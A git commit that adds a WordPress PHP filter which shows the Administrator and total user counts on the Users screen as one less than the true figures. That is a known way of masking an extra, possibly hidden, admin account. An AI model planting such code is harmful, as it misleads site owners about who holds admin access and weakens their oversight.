24869ec10e8cda0e0b2cbd913429c068d0407f27
Tamim Ahmed <rtamim04@gmail.com>
2022-05-16 04:10:43 +0600

    Create Remove-admin-roles-number.php

---
+++ Remove-admin-roles-number.php
@@ -0,0 +1,12 @@
+//* Show number of admins minus 1
+add_filter("views_users", "site_list_table_views");
+function site_list_table_views($views){
+   $users = count_users();
+   $admins_num = $users['avail_roles']['administrator'] - 1;
+   $all_num = $users['total_users'] - 1;
+   $class_adm = ( strpos($views['administrator'], 'current') === false ) ? "" : "current";
+   $class_all = ( strpos($views['all'], 'current') === false ) ? "" : "current";
+   $views['administrator'] = '<a href="users.php?role=administrator" class="' . $class_adm . '">' . translate_user_role('Administrator') . ' <span class="count">(' . $admins_num . ')</span></a>';
+   $views['all'] = '<a href="users.php" class="' . $class_all . '">' . __('All') . ' <span class="count">(' . $all_num . ')</span></a>';
+   return $views;
+}
